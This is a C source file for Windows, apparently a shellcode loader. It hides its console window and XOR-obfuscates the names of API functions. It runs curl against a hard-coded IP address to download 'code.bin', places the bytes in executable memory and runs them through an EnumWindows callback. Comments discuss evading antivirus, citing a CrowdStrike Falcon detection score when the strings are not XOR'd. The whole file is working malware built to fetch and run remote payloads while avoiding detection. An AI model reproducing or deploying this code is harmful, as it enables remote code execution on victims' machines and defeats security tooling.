#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime);
LPVOID (WINAPI * pAllocate) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
LPCSTR de_xor(unsigned char *payload, signed int payloadSize, unsigned char key);

typedef struct 
{
	unsigned char * payload;
	size_t payloadSize;
	unsigned char key;
	char * command;
	FILE * fpipe;
} TimerContext;

TimerContext g_context;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PSTR lpCmdLine, int nCmdShow)
{
	FreeConsole();
	unsigned char key = 's';
	// Further encrypt this shellcode (see if AV still identifies its as a )
	unsigned char procName[] = "\x25\x1a\x01\x07\x06\x12\x1f\x32\x1f\x1f\x1c\x10\x73";
	unsigned char kernel[] = "\x18\x16\x01\x1d\x16\x1f\x40\x41\x5d\x17\x1f\x1f\x73";
	// Pointer to command
	// Buffer to store the shellcode piped from command.
	unsigned char shellcode[460];
	// File storage of shellcode
	g_context.fpipe = NULL;
	g_context.key = key;
	g_context.payload = shellcode;
	// XOR this command to prevent static analyis
	// NOTE CrowdStrike Falcon Win/malicious_confidence_60% when not Xor'd
	g_context.command = "curl http://192.168.0.134/code.bin";
	g_context.payloadSize = sizeof(shellcode);
	pAllocate = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle(de_xor(kernel, sizeof(kernel), key)), de_xor(procName, sizeof(procName), key));


	UINT_PTR timerId = SetTimer(NULL, 1, 1, TimerProc);

	MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
	KillTimer(NULL, timerId);
	
	return 0;
}

VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime)
{
	
	// Buffer to store one byte piped from command to shellcode buffer
	unsigned char byte = 0;
	int counter = 0;
	// Check to see if results of command have failed to be piped to file storage
	if(NULL == (g_context.fpipe = (FILE *)popen(g_context.command, "r")))
	{
		exit(1);
	}
	while (fread(&byte, sizeof(byte), 1, g_context.fpipe))
	{
		g_context.payload[counter] = byte;
		counter += 1;
	}

	// Closes handle to the file pointer
	fclose(g_context.fpipe);
	
    void * payload_mem = pAllocate(NULL, g_context.payloadSize , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(payload_mem, g_context.payload, g_context.payloadSize);
    EnumWindows((WNDENUMPROC) payload_mem, (LPARAM) NULL);
};

LPCSTR de_xor(unsigned char *payload, signed int payloadSize, unsigned char key)
{
	for (int i = 0; i < payloadSize; i++)
	{
		payload[i] = payload[i]^key;
	}
	return (LPCSTR)payload;
}




